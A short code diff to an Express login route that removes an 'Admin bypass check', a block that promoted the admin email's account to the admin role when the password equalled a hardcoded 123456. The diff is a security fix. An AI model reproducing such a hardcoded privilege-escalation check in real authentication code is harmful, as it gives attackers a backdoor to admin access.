@@ -21,6 +21,8 @@ app.use(cors());
 // Connect to the database
 dbConnect();
 
+
+
 // Middleware to authenticate user
 const authenticateUser = (req, res, next) => {
   const token = req.headers.authorization;
@@ -278,13 +280,6 @@ app.post("/login", async (req, res) => {
     const isMatch = await bcrypt.compare(password, user.password);
     if (!isMatch) {
       return res.status(400).send({ message: "Invalid email or password" });
-    }
-
-    // Admin bypass check
-    const adminEmail = process.env.ADMINMAIL;
-    if (email === adminEmail && password === 123456) {
-      user.role = 1;
-      await user.save();
     }
 
     const token = jwt.sign(
